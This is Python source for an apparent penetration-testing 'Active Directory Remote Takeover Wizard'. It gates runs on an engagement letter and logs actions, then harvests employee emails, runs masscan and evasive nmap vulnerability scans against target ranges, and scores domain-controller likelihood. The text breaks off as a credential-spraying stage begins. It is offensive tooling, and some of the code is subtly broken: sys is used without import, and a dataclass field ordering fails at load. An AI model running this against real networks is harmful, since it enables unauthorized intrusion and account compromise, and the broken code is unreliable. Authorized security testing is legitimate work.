import os
import json
import uuid
import datetime
import shutil
import subprocess
import re
import dns.resolver
import whois
import hashlib
import argparse
import yaml
import requests
import time
import csv
import random
import signal
import unicodedata
import gzip
import pathlib
import threading
import getpass
import ipaddress
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass, field

# Dedicated libraries
try:
    from pypdf import PdfReader
except ImportError:
    print("Warning: pypdf not installed. PDF parsing will be limited.")
    PdfReader = None

try:
    import xml.etree.ElementTree as ET
except ImportError:
    print("Warning: ElementTree not available. Nmap output parsing will fail.")
    ET = None

# Pre-compiled regex patterns for sensitive data redaction
SENSITIVE_PATTERNS = [
    re.compile(r"authorization:\s*bearer\s+\S+", re.IGNORECASE),
    re.compile(r"x-ms-access-token:\s*\S+", re.IGNORECASE),
    re.compile(r"password\s*=\s*.+?(?=\s|$|\"|\')", re.IGNORECASE),
    re.compile(r":::[^:]+:[^:]+:[^:]+:[^:]+(?::|$)", re.IGNORECASE),
    re.compile(r"NTLMv1\s+Response:\s*\S+", re.IGNORECASE)
]

# Thread-safe abort event
ABORT_EVENT = threading.Event()

def signal_handler(signum, frame):
    """Sets the abort event for graceful shutdown."""
    print(f"\nReceived signal {signum}. Initiating graceful shutdown...")
    ABORT_EVENT.set()

# Register signal handlers
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# Utility function
def contains_any(haystack: str, terms: Tuple[str]) -> bool:
    """Checks if any term is a substring of the haystack (case-insensitive)."""
    hay = haystack.lower()
    return any(t in hay for t in terms)

# Data Classes
@dataclass
class Credential:
    username: str
    password: Optional[str] = field(default=None, repr=False)
    service: str
    type: str
    source: str
    mfa: bool = False
    is_domain_admin: bool = False
    note: str = ""
    hash_sha256: Optional[str] = field(default=None, repr=True)

    def __post_init__(self):
        if self.type == "plaintext" and self.password is not None:
            try:
                self.hash_sha256 = hashlib.sha256(self.password.encode()).hexdigest()
            except Exception:
                self.hash_sha256 = "HASH_CALC_ERROR"
        elif self.type == "hash" and self.password is not None:
            self.hash_sha256 = self.password.lower()

@dataclass
class TargetInfo:
    root_domains: List[str]
    suspected_cloud_tenant: str
    cloud_tenant_status: str
    optional_targets: List[str]
    resolved_ips: List[str] = field(default_factory=list)
    potential_ad_hosts: List[str] = field(default_factory=list)
    domain_sid: str = ""

@dataclass
class Job:
    uuid: str
    company: str
    testing_window: str
    engagement_letter_path: str
    timestamp_start: str
    timestamp_end: str = ""
    status: str = "initialized"
    target: TargetInfo = field(default_factory=lambda: TargetInfo([], "", "", []))
    recon_results: Dict[str, Any] = field(default_factory=dict)
    harvest_results: Dict[str, Any] = field(default_factory=dict)
    audit_log_path: str = ""
    results_dir: str = ""
    config: Dict[str, Any] = field(default_factory=dict)
    tool_cache: Dict[str, str] = field(default_factory=dict)
    rate_limit_next_allowed: Dict[str, float] = field(default_factory=dict)

class Wizard:
    def __init__(self, config: Dict[str, Any], args: argparse.Namespace):
        self.config = config or {}
        self.args = args
        self.job: Optional[Job] = None
        self._temp_files: List[pathlib.Path] = []

    def _get_tool_path(self, tool_name: str) -> Optional[pathlib.Path]:
        """Gets the verified executable path for a tool."""
        if ABORT_EVENT.is_set():
            return None

        if self.job and tool_name in self.job.tool_cache:
            return pathlib.Path(self.job.tool_cache[tool_name])

        tool_paths = self.config.get("tool_paths", {})
        executable = tool_paths.get(tool_name, tool_name)
        executable_path = shutil.which(executable)

        if executable_path:
            executable_path = pathlib.Path(executable_path).resolve()
            if self.job:
                self.job.tool_cache[tool_name] = str(executable_path)
            return executable_path

        print(f"Error: Required tool '{tool_name}' not found or not executable.")
        if self.job:
            self._log_audit({"event": "Tool Not Found", "tool": tool_name, "timestamp": str(datetime.datetime.now())})
            self._abort_wizard(f"Required tool '{tool_name}' not found.")
        else:
            sys.exit(1)
        return None

    def _create_directories(self, path: pathlib.Path) -> bool:
        """Ensures necessary directories exist."""
        if ABORT_EVENT.is_set():
            return False
        try:
            path.mkdir(parents=True, exist_ok=True)
            return True
        except OSError as e:
            print(f"Error creating directory {path}: {e}")
            if self.job:
                self._log_audit({"event": "Directory Creation Error", "directory": str(path), "error": str(e), "timestamp": str(datetime.datetime.now())})
            return False

    def _redact_sensitive_data(self, data: Dict[str, Any], sensitive_keys: List[str] = None) -> Dict[str, Any]:
        """Recursively redacts sensitive values in a dictionary, list, tuple, or set."""
        if sensitive_keys is None:
            sensitive_keys = ['password', 'authorization', 'x-ms-access-token']
        low_keys = {k.lower() for k in sensitive_keys}
        redacted = {}
        for key, value in data.items():
            if isinstance(value, dict):
                redacted[key] = self._redact_sensitive_data(value, sensitive_keys)
            elif isinstance(value, (list, tuple, set)):
                redacted[key] = [
                    self._redact_sensitive_data(item, sensitive_keys) if isinstance(item, dict) else item
                    for item in value
                ]
            elif key.lower() in low_keys:
                redacted[key] = "---REDACTED---"
            else:
                redacted[key] = value
        return redacted

    def _log_audit(self, data: Dict[str, Any]):
        """Appends data to the immutable audit log using gzip compression."""
        if ABORT_EVENT.is_set() or not self.job or not self.job.audit_log_path:
            print("Error: Cannot log audit data before job initialization.")
            return

        redacted_data = self._redact_sensitive_data(data)
        try:
            with gzip.open(self.job.audit_log_path, 'ab', compresslevel=1) as f:
                f.write(json.dumps(redacted_data, default=str).encode('utf-8') + b'\n')
        except Exception as e:
            print(f"Error writing to audit log {self.job.audit_log_path}: {e}")

    def _execute_command(self, command: List[str], cwd: Optional[pathlib.Path] = None, timeout: Optional[int] = None) -> tuple[str, str]:
        """Executes a shell command and returns stdout and stderr."""
        if ABORT_EVENT.is_set():
            return "", ""

        command_copy = command[:]
        audit_start_time = datetime.datetime.now()
        executable_name = command_copy[0]
        executable_path = self._get_tool_path(executable_name)
        if not executable_path:
            return "", f"Error: Tool '{executable_name}' not found."

        command_copy[0] = str(executable_path)
        try:
            print(f"Executing: {' '.join(command_copy)}")
            # Note: encoding='utf-8' is Python 3.11+; ignored but safe in 3.8+
            result = subprocess.run(
                command_copy,
                shell=False,
                capture_output=True,
                text=True,
                encoding='utf-8',
                check=True,
                cwd=cwd,
                timeout=timeout
            )
            audit_data = {
                "event": "Command Executed",
                "command": ' '.join(command_copy),
                "output_preview": result.stdout[:500] + ('...' if len(result.stdout) > 500 else ''),
                "error_preview": result.stderr[:500] + ('...' if len(result.stderr) > 500 else ''),
                "returncode": result.returncode,
                "timestamp_start": str(audit_start_time),
                "timestamp_end": str(datetime.datetime.now())
            }
            self._log_audit(audit_data)
            return result.stdout.strip(), result.stderr.strip()
        except subprocess.CalledProcessError as e:
            audit_data = {
                "event": "Command Execution Error",
                "command": ' '.join(command_copy),
                "error": e.stderr,
                "returncode": e.returncode,
                "timestamp_start": str(audit_start_time),
                "timestamp_end": str(datetime.datetime.now())
            }
            self._log_audit(audit_data)
            print(f"Error executing '{' '.join(command_copy)}' (Code {e.returncode}): {e.stderr}")
            return "", e.stderr.strip()
        except subprocess.TimeoutExpired:
            audit_data = {
                "event": "Command Timeout Error",
                "command": ' '.join(command_copy),
                "timeout": timeout,
                "timestamp_start": str(audit_start_time),
                "timestamp_end": str(datetime.datetime.now())
            }
            self._log_audit(audit_data)
            print(f"Error: Command timed out after {timeout}s: {' '.join(command_copy)}")
            return "", f"Command timed out after {timeout}s."
        except Exception as e:
            audit_data = {
                "event": "Unexpected Command Error",
                "command": ' '.join(command_copy),
                "error": str(e),
                "timestamp_start": str(audit_start_time),
                "timestamp_end": str(datetime.datetime.now())
            }
            self._log_audit(audit_data)
            print(f"Unexpected error executing '{' '.join(command_copy)}': {e}")
            return "", str(e)

    def _abort_wizard(self, reason: str = "Unknown reason"):
        """Logs an abort event and exits."""
        if self.job:
            self.job.status = "aborted"
            self.job.timestamp_end = str(datetime.datetime.now())
            self._log_audit({"event": "Wizard Aborted", "reason": reason, "timestamp": str(datetime.datetime.now())})
        print(f"\nWizard Aborted: {reason}")
        self._cleanup_temp_files()
        sys.exit(1)

    def _cleanup_temp_files(self):
        """Removes temporary files created during execution."""
        for temp_file in self._temp_files:
            try:
                if temp_file.exists():
                    temp_file.unlink()
                    self._log_audit({"event": "Temporary File Removed", "file": str(temp_file), "timestamp": str(datetime.datetime.now())})
            except Exception as e:
                print(f"Error removing temporary file {temp_file}: {e}")
        self._temp_files.clear()

    # Gatekeeper Screen
    def gatekeeper(self) -> bool:
        """Handles initial authorization and logging."""
        if ABORT_EVENT.is_set():
            return False

        print("--- 0 - Gatekeeper Screen (Legal & Scope) ---")
        engagement_letter_path = pathlib.Path(self.args.engagement_letter).resolve()
        target_company_name = self.args.company_name
        testing_window = self.args.testing_window
        run_uuid = self.args.run_uuid

        # Validate inputs
        if not engagement_letter_path.is_file() or engagement_letter_path.suffix.lower() != ".pdf":
            self._abort_wizard("Invalid or missing engagement letter PDF.")
            return False

        # Create directories
        results_dir = pathlib.Path(self.config.get("results_directory", "results")) / run_uuid
        audit_log_dir = results_dir / self.config.get("audit_log_subdir", "audit_logs")
        results_subdir = results_dir / self.config.get("results_subdir", "results")
        temp_dir = results_dir / "temp"

        for directory in [audit_log_dir, results_subdir, temp_dir]:
            if not self._create_directories(directory):
                self._abort_wizard(f"Failed to create directory {directory}.")
                return False

        audit_log_path = audit_log_dir / f"{run_uuid}.audit.log.gz"
        self.job = Job(
            uuid=run_uuid,
            company=target_company_name,
            testing_window=testing_window,
            engagement_letter_path=str(engagement_letter_path),
            timestamp_start=str(datetime.datetime.now()),
            audit_log_path=str(audit_log_path),
            results_dir=str(results_dir),
            config=self.config,
            tool_cache={},
            rate_limit_next_allowed={}
        )

        self._log_audit({
            "event": "Wizard Start",
            "uuid": self.job.uuid,
            "who": getpass.getuser(),
            "what": "Active Directory Remote Takeover Wizard",
            "when": self.job.timestamp_start,
            "engagement_letter": str(engagement_letter_path),
            "target_company": target_company_name,
            "testing_window": testing_window,
            "config_used": self.config
        })

        print(f"Audit log: {audit_log_path}")
        print(f"Results dir: {results_dir}")

        # Validate engagement letter
        if PdfReader:
            try:
                reader = PdfReader(engagement_letter_path)
                text = "".join(page.extract_text() or "" for page in reader.pages)
                if not text.strip():
                    self._abort_wizard("Could not extract text from PDF.")
                    return False

                normalized_text = unicodedata.normalize('NFKD', text).casefold()
                normalized_company_name = unicodedata.normalize('NFKD', target_company_name).casefold()
                if normalized_company_name not in normalized_text:
                    self._abort_wizard("Target company name not found in engagement letter.")
                    return False

                expected_checksum = self.config.get("gatekeeper", {}).get("engagement_checksum")
                if expected_checksum:
                    with open(engagement_letter_path, 'rb') as f:
                        file_hash = hashlib.sha256(f.read()).hexdigest()
                    if file_hash.lower() != str(expected_checksum).lower():
                        self._abort_wizard(f"Checksum mismatch. Expected {expected_checksum}, got {file_hash}.")
                        return False
                    self._log_audit({"event": "Checksum Passed", "checksum": file_hash, "timestamp": str(datetime.datetime.now())})

                self._log_audit({"event": "Engagement Letter Validated (pypdf)", "timestamp": str(datetime.datetime.now())})
            except Exception as e:
                self._abort_wizard(f"PDF parsing error: {e}.")
                return False
        else:
            pdftotext_path = self._get_tool_path('pdftotext')
            if not pdftotext_path:
                self._abort_wizard("pdftotext not found for PDF validation.")
                return False
            try:
                stdout, stderr = self._execute_command([str(pdftotext_path), str(engagement_letter_path), '-'])
                if stderr or not stdout.strip():
                    self._abort_wizard(f"pdftotext error: {stderr}.")
                    return False
                normalized_text = unicodedata.normalize('NFKD', stdout).casefold()
                normalized_company_name = unicodedata.normalize('NFKD', target_company_name).casefold()
                if normalized_company_name not in normalized_text:
                    self._abort_wizard("Target company name not found in engagement letter (pdftotext).")
                    return False
                self._log_audit({"event": "Engagement Letter Validated (pdftotext)", "timestamp": str(datetime.datetime.now())})
            except Exception as e:
                self._abort_wizard(f"pdftotext error: {e}.")
                return False

        self.job.status = "running"
        print(f"Gatekeeper validation successful for UUID: {self.job.uuid}")
        return True

    # Target Definition
    def target_definition(self) -> bool:
        """Defines and validates target parameters."""
        if ABORT_EVENT.is_set():
            return False

        print("\n--- 1 - Target Definition ---")
        self._log_audit({"event": "Starting Target Definition", "timestamp": str(datetime.datetime.now())})

        target_config = self.config.get("target_definition", {})
        root_domains = [d.strip() for d in target_config.get("root_domains", "").split(',') if d.strip()]
        suspected_cloud_tenant = target_config.get("suspected_cloud_tenant", "").strip()
        optional_targets = [t.strip() for t in target_config.get("optional_targets", "").split(',') if t.strip()]

        validated_domains: List[str] = []
        for domain in root_domains:
            if ABORT_EVENT.is_set():
                return False
            print(f"Validating domain: {domain}")
            try:
                dns.resolver.resolve(domain, 'A', lifetime=self.config.get("timeouts", {}).get("dns_resolve", 5))
                try:
                    w = whois.whois(domain)
                    comp_match = False
                    if w.text:
                        normalized_whois = unicodedata.normalize('NFKD', w.text).casefold()
                        normalized_company = unicodedata.normalize('NFKD', self.job.company).casefold()
                        comp_match = normalized_company in normalized_whois
                    if comp_match:
                        validated_domains.append(domain)
                        self._log_audit({"event": "Domain Validation Success", "domain": domain, "timestamp": str(datetime.datetime.now())})
                    else:
                        print(f"Warning: WHOIS for '{domain}' does not match company name.")
                        validated_domains.append(domain)
                        self._log_audit({"event": "WHOIS Mismatch", "domain": domain, "timestamp": str(datetime.datetime.now())})
                except whois.parser.PyWhoisError as e:
                    print(f"Warning: WHOIS error for '{domain}': {e}. Adding if resolved.")
                    dns.resolver.resolve(domain, 'A', lifetime=1)
                    validated_domains.append(domain)
                    self._log_audit({"event": "WHOIS Error", "domain": domain, "error": str(e), "timestamp": str(datetime.datetime.now())})
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.NoNameservers):
                print(f"Warning: Domain '{domain}' does not resolve (A record).")
                self._log_audit({"event": "DNS No A Record", "domain": domain, "timestamp": str(datetime.datetime.now())})
            except dns.resolver.Timeout:
                print(f"Warning: DNS timeout for '{domain}'.")
                self._log_audit({"event": "DNS Timeout", "domain": domain, "timestamp": str(datetime.datetime.now())})
            except Exception as e:
                print(f"Warning: Error validating '{domain}': {e}. Adding if resolved.")
                try:
                    dns.resolver.resolve(domain, 'A', lifetime=1)
                    validated_domains.append(domain)
                except:
                    pass
                self._log_audit({"event": "Domain Validation Error", "domain": domain, "error": str(e), "timestamp": str(datetime.datetime.now())})

        validated_optional_targets: List[str] = []
        for target in optional_targets:
            if ABORT_EVENT.is_set():
                return False
            try:
                ipaddress.ip_network(target, strict=False)
                validated_optional_targets.append(target)
                self._log_audit({"event": "Optional Target Validated", "target": target, "timestamp": str(datetime.datetime.now())})
            except ValueError:
                print(f"Warning: Invalid IP/CIDR: {target}.")
                self._log_audit({"event": "Optional Target Invalid", "target": target, "timestamp": str(datetime.datetime.now())})

        if not validated_domains and not validated_optional_targets:
            self._abort_wizard("No valid target domains or IPs provided.")
            return False

        cloud_tenant_status = "Unknown"
        if suspected_cloud_tenant:
            print(f"Checking cloud tenant: {suspected_cloud_tenant}")
            getuserrealm_url = f"https://login.microsoftonline.com/getuserrealm.srf?login=testuser@{suspected_cloud_tenant}&xml=1"
            try:
                session = requests.Session()
                retries = requests.packages.urllib3.util.retry.Retry(total=5, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
                session.mount('https://', requests.adapters.HTTPAdapter(max_retries=retries))
                session.verify = True
                session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
                response = session.get(getuserrealm_url, allow_redirects=False, timeout=self.config.get("timeouts", {}).get("getuserrealm", 15))
                response.raise_for_status()
                self._log_audit({"event": "GetUserRealm Success", "cloud_tenant": suspected_cloud_tenant, "status_code": response.status_code, "timestamp": str(datetime.datetime.now())})
                if response.status_code == 200 and "Managed" in response.text:
                    cloud_tenant_status = "Managed"
                elif response.status_code == 302 and "Federated" in response.headers.get('Location', ''):
                    cloud_tenant_status = "Federated"
                else:
                    cloud_tenant_status = "Unclear"
                print(f"Cloud tenant status: {cloud_tenant_status}")
            except requests.exceptions.RequestException as e:
                print(f"GetUserRealm error for '{suspected_cloud_tenant}': {e}")
                cloud_tenant_status = "Error"
                self._log_audit({"event": "GetUserRealm Error", "cloud_tenant": suspected_cloud_tenant, "error": str(e), "timestamp": str(datetime.datetime.now())})

        self.job.target = TargetInfo(
            root_domains=validated_domains,
            suspected_cloud_tenant=suspected_cloud_tenant,
            cloud_tenant_status=cloud_tenant_status,
            optional_targets=validated_optional_targets
        )
        self._log_audit({"event": "Target Definition Complete", "target_info": self.job.target.__dict__, "timestamp": str(datetime.datetime.now())})
        print("Target definition complete.")
        return True

    # Recon & Surface Mapping
    def _resolve_domains_to_ips(self, domains: List[str]) -> List[str]:
        """Resolves domains to IPv4 addresses."""
        if ABORT_EVENT.is_set():
            return []

        resolved_ips: List[str] = []
        for domain in domains:
            if ABORT_EVENT.is_set():
                break
            try:
                answers = dns.resolver.resolve(domain, 'A', lifetime=self.config.get("timeouts", {}).get("dns_resolve", 5))
                for rdata in answers:
                    ip = str(rdata)
                    resolved_ips.append(ip)
                    self._log_audit({"event": "DNS Resolution Success", "domain": domain, "ip": ip, "timestamp": str(datetime.datetime.now())})
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.NoNameservers) as e:
                print(f"Warning: Could not resolve '{domain}': {e}")
                self._log_audit({"event": "DNS Resolution Failed", "domain": domain, "error": str(e), "timestamp": str(datetime.datetime.now())})
            except dns.resolver.Timeout:
                print(f"Warning: DNS timeout for '{domain}'.")
                self._log_audit({"event": "DNS Timeout", "domain": domain, "timestamp": str(datetime.datetime.now())})
            except Exception as e:
                print(f"Warning: Error resolving '{domain}': {e}")
                self._log_audit({"event": "DNS Error", "domain": domain, "error": str(e), "timestamp": str(datetime.datetime.now())})

        return list(set(resolved_ips))

    def recon_surface_mapping(self) -> bool:
        """Performs reconnaissance and maps the target surface."""
        if ABORT_EVENT.is_set():
            return False

        print("\n--- 2 - Recon & Surface Mapping ---")
        self._log_audit({"event": "Starting Recon", "timestamp": str(datetime.datetime.now())})

        self.job.recon_results = {
            "passive_assets": [],
            "active_scanned_ips": [],
            "potential_ad_hosts": [],
            "ad_likelihood_score": 0,
            "nmap_xml_path": "",
            "hunterio_emails": []
        }

        passive_recon_config = self.config.get("recon_surface_mapping", {}).get("passive_recon", {})
        if passive_recon_config.get("enabled", False):
            print("Performing passive reconnaissance...")
            all_domains = self.job.target.root_domains + ([self.job.target.suspected_cloud_tenant] if self.job.target.suspected_cloud_tenant else [])

            crtsh_config = passive_recon_config.get("crtsh", {})
            if crtsh_config.get("enabled", False):
                print("Querying crt.sh...")
                certsh_path = self._get_tool_path('certsh.py')
                if certsh_path:
                    try:
                        stdout, stderr = self._execute_command([str(certsh_path), ",".join(all_domains)], timeout=crtsh_config.get("timeout", 180))
                        reader = csv.reader(stdout.splitlines())
                        rows = list(reader)
                        if rows and rows[0][0].lower().strip() == 'fqdn':
                            rows = rows[1:]
                        for row in rows:
                            if ABORT_EVENT.is_set():
                                break
                            if len(row) >= 3 and all(cell.strip() for cell in row[:3]):
                                self.job.recon_results["passive_assets"].append({
                                    "fqdn": row[0].strip(),
                                    "ip": row[1].strip(),
                                    "open_ports": row[2].strip()
                                })
                        self._log_audit({"event": "crt.sh Complete", "assets_found": len(self.job.recon_results['passive_assets']), "timestamp": str(datetime.datetime.now())})
                        print(f"Found {len(self.job.recon_results['passive_assets'])} assets from crt.sh.")
                    except Exception as e:
                        print(f"Error in crt.sh recon: {e}")
                        self._log_audit({"event": "crt.sh Error", "error": str(e), "timestamp": str(datetime.datetime.now())})

            hunterio_config = passive_recon_config.get("hunterio", {})
            if hunterio_config.get("enabled", False):
                print("Querying Hunter.io...")
                hunterio_path = self._get_tool_path('hunterio_tool')
                if hunterio_path and all_domains:
                    try:
                        stdout, stderr = self._execute_command([str(hunterio_path), '--domain', all_domains[0]], timeout=hunterio_config.get("timeout", 120))
                        try:
                            emails = json.loads(stdout)
                        except json.JSONDecodeError:
                            emails = stdout.splitlines()
                        self.job.recon_results["hunterio_emails"] = [e.strip() for e in emails if e.strip()]
                        self._log_audit({"event": "Hunter.io Complete", "emails_found": len(self.job.recon_results["hunterio_emails"]), "timestamp": str(datetime.datetime.now())})
                        print(f"Found {len(self.job.recon_results['hunterio_emails'])} emails from Hunter.io.")
                    except Exception as e:
                        print(f"Hunter.io error: {e}")
                        self._log_audit({"event": "Hunter.io Error", "error": str(e), "timestamp": str(datetime.datetime.now())})

            if self.job.recon_results["passive_assets"]:
                passive_recon_csv = pathlib.Path(self.job.results_dir) / self.config.get("results_subdir", "results") / f"{self.job.uuid}_passive_recon.csv"
                if self._create_directories(passive_recon_csv.parent):
                    with open(passive_recon_csv, 'w', newline='') as csvfile:
                        writer = csv.DictWriter(csvfile, fieldnames=['fqdn', 'ip', 'open_ports'])
                        writer.writeheader()
                        for asset in self.job.recon_results["passive_assets"]:
                            writer.writerow(asset)
                    self._log_audit({"event": "Passive Recon CSV Saved", "count": len(self.job.recon_results['passive_assets']), "filepath": str(passive_recon_csv), "timestamp": str(datetime.datetime.now())})
                    print(f"Passive recon results saved to {passive_recon_csv}")

        active_scan_config = self.config.get("recon_surface_mapping", {}).get("active_scan", {})
        if active_scan_config.get("enabled", False):
            print("\nPerforming active scan...")
            self.job.target.resolved_ips = self._resolve_domains_to_ips(self.job.target.root_domains)
            scan_targets = set(self.job.target.resolved_ips)

            for target in self.job.target.optional_targets:
                try:
                    network = ipaddress.ip_network(target, strict=False)
                    cidr_limit = active_scan_config.get("cidr_expansion_limit", 65536)
                    if network.num_addresses > cidr_limit:
                        print(f"Warning: CIDR {target} ({network.num_addresses} addresses) exceeds limit ({cidr_limit}).")
                        self._log_audit({"event": "CIDR Limit Exceeded", "cidr": target, "size": network.num_addresses, "limit": cidr_limit, "timestamp": str(datetime.datetime.now())})
                        continue
                    for ip in network.hosts():
                        scan_targets.add(str(ip))
                except ValueError:
                    scan_targets.add(target)

            if not scan_targets:
                print("No targets for active scan.")
                self._log_audit({"event": "No Scan Targets", "timestamp": str(datetime.datetime.now())})
                return True

            exclusion_list = active_scan_config.get("exclusion_list", [])
            final_scan_ips = []
            for target_ip in scan_targets:
                if ABORT_EVENT.is_set():
                    break
                try:
                    ip_addr = ipaddress.ip_address(target_ip)
                    excluded = any(ip_addr in ipaddress.ip_network(excl, strict=False) for excl in exclusion_list)
                    if not excluded:
                        final_scan_ips.append(target_ip)
                    else:
                        self._log_audit({"event": "Target Excluded", "target": target_ip, "timestamp": str(datetime.datetime.now())})
                except ValueError:
                    final_scan_ips.append(target_ip)

            if not final_scan_ips:
                print("All targets excluded.")
                self._log_audit({"event": "All Targets Excluded", "timestamp": str(datetime.datetime.now())})
                return True

            self.job.recon_results["active_scanned_ips"] = final_scan_ips
            masscan_targets_file = pathlib.Path(self.job.results_dir) / self.config.get("results_subdir", "results") / f"{self.job.uuid}_masscan_targets.txt"
            if self._create_directories(masscan_targets_file.parent):
                with open(masscan_targets_file, 'w') as f:
                    for ip in final_scan_ips:
                        f.write(f"{ip}\n")
                self._temp_files.append(masscan_targets_file)

                masscan_path = self._get_tool_path('masscan')
                if not masscan_path:
                    return True  # Tool missing, logged in _get_tool_path

                masscan_output_file = masscan_targets_file.with_name(f"{self.job.uuid}_masscan_raw.txt")
                masscan_command = [
                    str(masscan_path),
                    "-iL", str(masscan_targets_file),
                    f"-p{active_scan_config.get('scan_ports', '88,135,139,389,445,593,636,3268,3269,53,587,443')}",
                    f"--rate={active_scan_config.get('masscan_rate', 1000)}",
                    "-oL", str(masscan_output_file),
                    "--wait", "0"
                ]
                stdout, stderr = self._execute_command(masscan_command, timeout=active_scan_config.get("masscan_timeout", 300))
                self._log_audit({"event": "Masscan Executed", "command": " ".join(masscan_command), "timestamp": str(datetime.datetime.now())})

                if not masscan_output_file.exists():
                    print(f"Masscan output file {masscan_output_file} not found.")
                    self._log_audit({"event": "Masscan Output Missing", "file": str(masscan_output_file), "timestamp": str(datetime.datetime.now())})
                    return True

                open_ports_by_ip: Dict[str, List[str]] = {}
                with open(masscan_output_file, 'r') as f:
                    for line in f:
                        if ABORT_EVENT.is_set():
                            break
                        if line.startswith('open'):
                            parts = line.split()
                            if len(parts) >= 6:
                                open_ports_by_ip.setdefault(parts[5], []).append(parts[3])
                self._log_audit({"event": "Masscan Parsed", "ips": len(open_ports_by_ip), "timestamp": str(datetime.datetime.now())})

                nmap_targets = list(open_ports_by_ip.keys())
                if nmap_targets:
                    nmap_targets_file = masscan_targets_file.with_name(f"{self.job.uuid}_nmap_targets.txt")
                    with open(nmap_targets_file, 'w') as f:
                        for ip in nmap_targets:
                            f.write(f"{ip}\n")
                    self._temp_files.append(nmap_targets_file)

                    nmap_path = self._get_tool_path('nmap')
                    if not nmap_path:
                        return True  # Tool missing, logged in _get_tool_path

                    nmap_xml_output = masscan_targets_file.with_name(f"{self.job.uuid}_nmap_scripted.xml")
                    self.job.recon_results["nmap_xml_path"] = str(nmap_xml_output)
                    unique_ports = list(set(port for ports in open_ports_by_ip.values() for port in ports))
                    nmap_max_ports = active_scan_config.get("nmap_max_ports", 25)
                    ports_to_scan = unique_ports[:nmap_max_ports] if len(unique_ports) > nmap_max_ports else unique_ports
                    nmap_command = [
                        str(nmap_path), "-sV",
                        "-iL", str(nmap_targets_file),
                        "-oX", str(nmap_xml_output),
                        "--script", active_scan_config.get("nmap_script_set", "default,auth,vuln,ldap*"),
                        "--script-timeout", str(active_scan_config.get("nmap_script_timeout", 60)),
                        "--version-intensity", "7",
                        "--max-rate", str(active_scan_config.get("nmap_max_rate", 100)),
                        "--defeat-rst-ratelimit",
                        "--randomize-hosts"
                    ]
                    if ports_to_scan:
                        nmap_command.extend(["-p", ",".join(ports_to_scan)])
                    stdout, stderr = self._execute_command(nmap_command, timeout=active_scan_config.get("nmap_timeout", 600))
                    self._log_audit({"event": "Nmap Executed", "command": " ".join(nmap_command), "timestamp": str(datetime.datetime.now())})

                    if not nmap_xml_output.exists():
                        print(f"Nmap output file {nmap_xml_output} not found.")
                        self._log_audit({"event": "Nmap Output Missing", "file": str(nmap_xml_output), "timestamp": str(datetime.datetime.now())})
                        return True

                    if ET:
                        ad_indicators_score = 0
                        potential_ad_hosts = set()
                        try:
                            tree = ET.parse(nmap_xml_output)
                            root = tree.getroot()
                            for host in root.findall('host'):
                                if ABORT_EVENT.is_set():
                                    break
                                addr = host.find('address').get('addr') if host.find('address') is not None else None
                                if not addr:
                                    continue
                                host_is_ad = False
                                for port in host.findall('ports/port'):
                                    port_id = int(port.get('portid', 0)) or 0
                                    state = port.find('state').get('state', '') if port.find('state') is not None else ''
                                    service = port.find('service')
                                    if state == 'open' and service is not None:
                                        name = service.get('name', '').lower()
                                        product = service.get('product', '').lower()
                                        extrainfo = service.get('extrainfo', '').lower()
                                        if port_id in (88, 464) and contains_any(name, ('kerberos',)) or contains_any(extrainfo, ('kerberos',)):
                                            ad_indicators_score += 40
                                            host_is_ad = True
                                        elif port_id in (389, 636) and contains_any(name, ('ldap',)) or contains_any(extrainfo, ('ldap',)):
                                            ad_indicators_score += 30
                                            host_is_ad = True
                                        elif port_id in (3268, 3269) and (contains_any(name, ('globalcat', 'ldap')) or contains_any(extrainfo, ('globalcat', 'ldap'))):
                                            ad_indicators_score += 20
                                            host_is_ad = True
                                        elif port_id == 445 and contains_any(name, ('microsoft-ds', 'smb')) and 'windows' in product:
                                            ad_indicators_score += 10
                                            host_is_ad = True
                                        elif port_id == 135 and 'ms-rpc' in name and 'windows' in product:
                                            ad_indicators_score += 10
                                    for script in port.findall('script'):
                                        if script.get('id') == 'smb-os-discovery' and script.text and 'challenge_from' in script.text.lower():
                                            ad_indicators_score += 20
                                            host_is_ad = True
                                for script in host.findall('hostscript/script'):
                                    if script.get('id') == 'dns-srv-enum' and script.text and 'domain controller' in script.text.lower():
                                        ad_indicators_score += 40
                                        host_is_ad = True
                                if host_is_ad:
                                    potential_ad_hosts.add(addr)
                            self.job.recon_results["potential_ad_hosts"] = list(potential_ad_hosts)
                            self.job.recon_results["ad_likelihood_score"] = min(ad_indicators_score, 100)
                            self._log_audit({"event": "AD Score Calculated", "score": self.job.recon_results["ad_likelihood_score"], "hosts": len(potential_ad_hosts), "timestamp": str(datetime.datetime.now())})
                            print(f"AD Likelihood Score: {self.job.recon_results['ad_likelihood_score']}%")
                        except ET.ParseError as e:
                            print(f"Error parsing Nmap XML: {e}")
                            self._log_audit({"event": "Nmap XML Error", "error": str(e), "timestamp": str(datetime.datetime.now())})

        ad_threshold = self.config.get("recon_surface_mapping", {}).get("ad_likelihood_threshold", 70)
        if self.job.recon_results["ad_likelihood_score"] < ad_threshold:
            if self.config.get("recon_surface_mapping", {}).get("override_threshold_on_low_score", False):
                print("Overriding low AD likelihood score.")
                self._log_audit({"event": "AD Threshold Override", "score": self.job.recon_results["ad_likelihood_score"], "threshold": ad_threshold, "timestamp": str(datetime.datetime.now())})
            else:
                print(f"AD likelihood score ({self.job.recon_results['ad_likelihood_score']}%) below threshold ({ad_threshold}%). Halting.")
                self.job.status = "halted_after_recon"
                self.job.timestamp_end = str(datetime.datetime.now())
                self._log_audit({"event": "Halted After Recon", "score": self.job.recon_results["ad_likelihood_score"], "threshold": ad_threshold, "timestamp": str(datetime.datetime.now())})
                return False

        self._log_audit({"event": "Recon Complete", "timestamp": str(datetime.datetime.now())})
        print("Recon complete.")
        return True

    # Credential Harvest & Spray
    def _get_rate_limit_key(self, target: str) -> str:
        """Determines the rate limit key for a target."""
        target = target.lower()
        if target in ["m365", "owa", "adfs", "citrix", "vpn"]:
            domain = self.job.target.suspected_cloud_tenant or (self.job.target.root_domains[0] if self.job.target.root_domains else None)
            if not domain:
                raise ValueError("No domain available for rate limiting.")
            return domain.lower()
        return target

    def _acquire_token(self, target: str, rate_per_minute: float) -> bool:
        """Acquires a rate limit token."""
        if ABORT_EVENT.is_set():
            return False

